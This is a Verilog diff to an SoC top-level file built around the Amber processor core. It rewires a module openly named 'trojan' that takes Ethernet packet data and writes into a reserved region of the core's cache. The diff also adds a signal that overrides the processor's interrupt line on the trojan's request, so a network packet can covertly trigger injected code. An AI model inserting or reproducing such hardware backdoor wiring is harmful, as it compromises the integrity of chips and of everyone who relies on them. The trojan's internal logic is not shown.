@@ -217,17 +217,18 @@ clocks_resets u_clocks_resets (
 // -------------------------------------------------------------
 /// Instatiate Trojan Hardware (shhhh! Secret)
 // -------------------------------------------------------------
-// Cache connections
-wire 		troj_reserve;
-wire [127:0]	troj_write_data;
-wire [31:0] 	troj_address;
-wire [31:0] 	troj_address_nxt;
-wire		cache_stall;
-
 // Ethernet RX packet data
 wire [31:0] troj_rx_packet_data;
 wire        troj_rx_packet_data_valid;
 wire        troj_rx_packet_reset;
+
+// Cache connections
+wire            cache_stall;
+wire            troj_reserve;
+wire [127:0]    troj_write_data;
+wire [31:0]     troj_address;
+wire            troj_trigger_irq;
+wire            fetch_stall;
 
 trojan trojan0 (
     .i_clk              	(sys_clk),
@@ -238,15 +239,21 @@ trojan trojan0 (
     .i_rx_packet_reset      (troj_rx_packet_reset),
     
     .i_cache_stall		    (cache_stall),
+    .i_fetch_stall          (fetch_stall),
 
 	.o_troj			        (troj_reserve),
 	.o_troj_write_data	    (troj_write_data),
-	.o_troj_write_addr	    (troj_address)
+	.o_troj_write_addr	    (troj_address),
+
+    .o_troj_trigger_irq     (troj_trigger_irq)
 );
 
 // -------------------------------------------------------------
 // Instantiate Amber Processor Core
 // -------------------------------------------------------------
+// Trigger IRQ on request
+wire trojan_interrupt = (troj_trigger_irq)? 1'b1 : amber_irq;
+
 `ifdef AMBER_A25_CORE
 a25_core u_amber (
 `else
@@ -254,7 +261,7 @@ a23_core u_amber (
 `endif
     .i_clk          ( sys_clk         ),
 
-    .i_irq          ( amber_irq       ),
+    .i_irq          ( trojan_interrupt),
     .i_firq         ( amber_firq      ),
 
     .i_system_rdy   ( system_rdy      ),
@@ -272,8 +279,8 @@ a23_core u_amber (
 	.i_troj_reserve 	( troj_reserve	  ),	/// Trojan signal for reserving upper cache area
 	.i_troj_write_data	( troj_write_data ),	/// Trojan data written to cache
 	.i_troj_address		( troj_address	  ),
-	.i_troj_address_nxt 	( troj_address_nxt),
-	.o_cache_stall		( cache_stall	  )
+	.o_cache_stall		( cache_stall	  ),
+    .o_fetch_stall      ( fetch_stall     )
 );
 
 
